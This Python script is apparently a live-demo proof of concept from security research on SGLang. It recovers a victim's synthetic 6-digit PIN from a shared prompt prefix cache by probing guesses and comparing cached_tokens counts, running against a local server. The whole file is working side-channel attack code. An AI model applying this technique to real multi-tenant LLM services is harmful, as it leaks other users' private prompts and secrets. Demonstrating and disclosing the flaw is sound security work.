"""
demo_pin_recovery.py - interactive single-trial demo of chained PIN
recovery, for live demonstration.

Enter any 6-digit PIN. The script populates it as the "victim" prompt,
then recovers it digit-by-digit using ONLY cache observations - the
recovery logic never reads the PIN you typed, it only sees cache
responses, exactly like the batch experiment.
"""
import sys
import os
import time
import requests

sys.path.insert(0, os.path.dirname(__file__))
from measure import send_request
from config import SHARED_PUBLIC_PREFIX, PIN_LENGTH, PIN_LABEL, PIN_SEPARATOR, PIN_TRAILING_MARKER

FLUSH_URL = "http://localhost:30000/flush_cache"
GAP_SECONDS = 1

def flush_cache():
    requests.post(FLUSH_URL, timeout=10)

def format_pin(digits: str) -> str:
    return PIN_SEPARATOR.join(list(digits))

def victim_populate(pin_digits: str):
    prompt = SHARED_PUBLIC_PREFIX + PIN_LABEL + format_pin(pin_digits) + PIN_TRAILING_MARKER
    return send_request(prompt)

def attacker_probe(known_prefix_digits: str, guess_digit: str):
    remaining = PIN_LENGTH - len(known_prefix_digits) - 1
    guess_digits = known_prefix_digits + guess_digit + "0" * remaining
    prompt = SHARED_PUBLIC_PREFIX + PIN_LABEL + format_pin(guess_digits) + PIN_TRAILING_MARKER
    return send_request(prompt)

def main():
    print("=" * 60)
    print("SGLang Cross-Tenant Cache Leakage — Live Demo")
    print("=" * 60)
    pin = input(f"\nEnter a {PIN_LENGTH}-digit synthetic PIN for the VICTIM to use: ").strip()

    if len(pin) != PIN_LENGTH or not pin.isdigit():
        print(f"Please enter exactly {PIN_LENGTH} digits.")
        return

    print(f"\n[Victim] Using PIN internally. Attacker cannot see this value directly.")
    print(f"[Attacker] Beginning recovery using ONLY cache observations...\n")

    recovered = ""
    for position in range(PIN_LENGTH):
        best_digit, best_cached = None, -1
        for guess in "0123456789":
            flush_cache()
            time.sleep(0.3)
            victim_populate(pin)
            time.sleep(GAP_SECONDS)
            r = attacker_probe(recovered, guess)
            if r["cached_tokens"] > best_cached:
                best_cached = r["cached_tokens"]
                best_digit = guess
        recovered += best_digit
        print(f"  Position {position+1}: attacker recovers digit '{best_digit}' "
              f"(cached_tokens={best_cached}) -> so far: {recovered}")

    print(f"\n{'='*60}")
    print(f"Victim's real PIN:      {pin}")
    print(f"Attacker recovered PIN: {recovered}")
    print(f"Result: {'FULL MATCH - secret recovered' if recovered == pin else 'MISMATCH'}")
    print(f"{'='*60}")

if __name__ == "__main__":
    main()
